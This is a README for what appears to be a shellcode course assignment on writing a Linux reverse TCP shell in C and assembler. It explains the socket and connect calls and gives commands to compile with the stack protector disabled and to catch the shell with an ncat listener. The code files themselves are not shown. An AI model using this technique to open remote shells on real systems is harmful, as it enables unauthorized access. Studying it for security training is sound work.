Assignment 2
============

* create a reverse TCP shellcode:
    * reverse connects to configured IP and port
    * execs shell on successful connection
* IP and port should be easily configurable


Reverse shell prototype in C
----------------------------

Reverse shell C program can reuse most of the code introduced in the 1st
assignment. General work flow for connecting to remote server is following:

1. Create socket using `socket()` call
2. Connect to remote server using `connect()` call

Function `connect()` is prototyped in the following way (`man 2 connect`):

    int connect(int sockfd, const struct sockaddr *serv_addr, socklen_t addrlen);

Function arguments can be defined in the same manner as in `bind()` call, this
time however address of remote peer must be included:

    // peer IP address (network byte order)
    sin_addr.s_addr = inet_addr(IP)

Complete version of program can be found in file named `revshell.c`.

It should be noted that presented code doesn't follow best practices, e.g. at no
point are return values checked for errors. It was meant only to be used as a
template for further work on assembler version.


Reverse shell in assembler
--------------------------

Commented assembler version of `revshell.c` can be found in file called
`revshell.asm`.


Compilation
-----------

`compile.sh` script can be used to set IP and port, compile and link. For
example file `revshell.asm` can be compiled to executable which will then
connect to host 192.168.15.1 and TCP port 4444 with following command:

    ./compile.sh revshell.asm 192.168.15.1 4444

Script will also print shellcode and its length. Shellcode itself can be placed
in file `run_shellcode.c` and then compiled with:

    gcc -fno-stack-protector -z execstack -o run_shellcode run_shellcode.c

Note that some IP and port values can result in null bytes to be present in
shellcode.


Testing
-------

Execute listener (e.g. `ncat -nvl 192.168.15.1 4444`) and `./run_shellcode`:

    $ ncat -nvl 192.168.15.1 4444
    Ncat: Version 6.25 ( http://nmap.org/ncat )
    Ncat: Listening on 192.168.15.1:4444
    Ncat: Connection from 192.168.15.1.
    Ncat: Connection from 192.168.15.1:52008.
    cowsay -p moooo
     _______ 
    < moooo >
     ------- 
            \   ^__^
             \  (@@)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||


References
----------

* [Linux System Call Table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
* [Programming IP Sockets on Linux, Part One](http://gnosis.cx/publish/programming/sockets.html)
* [Writing shellcode for Linux and BSD](http://www.kernel-panic.it/security/shellcode/)


<!---
vim: set textwidth=80 wrapmargin=2:
-->
